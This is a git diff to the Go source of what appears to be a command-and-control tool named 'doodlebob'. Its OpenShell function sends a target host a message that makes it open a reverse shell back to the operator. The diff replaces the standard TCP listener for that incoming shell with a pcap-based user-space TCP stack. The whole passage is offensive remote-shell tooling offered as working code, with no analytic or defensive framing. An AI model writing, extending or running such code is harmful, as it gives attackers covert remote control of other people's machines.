@@ -2,16 +2,21 @@
 package cli
 
 import (
+	"context"
 	"encoding/json"
 	"fmt"
 	"io"
 	"math/rand"
 	"net"
+	"net/netip"
 	"os"
+	"os/signal"
 	"strconv"
+	"time"
 
 	"github.com/MeHungr/doodlebob/internal/message"
 	"github.com/MeHungr/doodlebob/pkg/network"
+	"github.com/MeHungr/pcapnet"
 	"golang.org/x/term"
 )
 
@@ -108,18 +113,36 @@ func Heartbeat(udpTarget, targetIP, targetPort, srcIP, srcPort string) error {
 func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellType) error {
 	// Obtains the source ip and picks a random port for the reverse shell
 	rawIP := network.LocalIP().String()
-	srcPort := strconv.Itoa(rand.Intn(45000) + 10000)
+	srcPort := rand.Intn(45000) + 10000
 	srcIP, _, err := net.SplitHostPort(rawIP)
 	if err != nil {
 		srcIP = rawIP
 	}
 
-	// Open reverse shell listener on random tcp port
-	listener, err := net.Listen("tcp", ":"+srcPort)
+	// ========= PCAP TCP STACK ==========
+	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
+	defer stop()
+	setupCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
+	defer cancel()
+	pool, err := netip.ParsePrefix("172.16.0.0/16")
+	if err != nil {
+		return fmt.Errorf("invalid -subnet: %w", err)
+	}
+	addr := network.LocalIP().IP
+	localIP, _ := netip.AddrFromSlice(addr)
+	device, err := network.GetNetworkInterface(addr)
+	if err != nil {
+		return fmt.Errorf("invalid interface: %w", err)
+	}
+	udpCfg := pcapnet.UDPConfig{DeviceName: device.Name, LocalIP: localIP, LocalPort: uint16(srcPort), ReserveUDPPort: true}
+	serverCfg := pcapnet.ServerConfig{VirtualIP: localIP, AddressPool: pool, MTU: 1200, MaxPeers: 1}
+	var listener *pcapnet.TCPServer
+	listener, err = pcapnet.ListenPCAPTCP(setupCtx, udpCfg, serverCfg, srcPort)
 	if err != nil {
 		return fmt.Errorf("opening shell listener: %w", err)
 	}
 	defer listener.Close() // Close listener when function returns
+	// ========= PCAP TCP STACK ==========
 
 	// Channel to capture the incoming connection asynchronously
 	type connResult struct {
@@ -135,7 +158,8 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 	}()
 
 	// Listener is running in the background, so we can send the message to the target
-	if err := sendShell(udpTarget, targetIP, targetPort, srcIP, srcPort, shellType); err != nil {
+	portStr := strconv.Itoa(srcPort)
+	if err := sendShell(udpTarget, targetIP, targetPort, srcIP, portStr, shellType); err != nil {
 		return fmt.Errorf("sending shell message: %w", err)
 	}
 
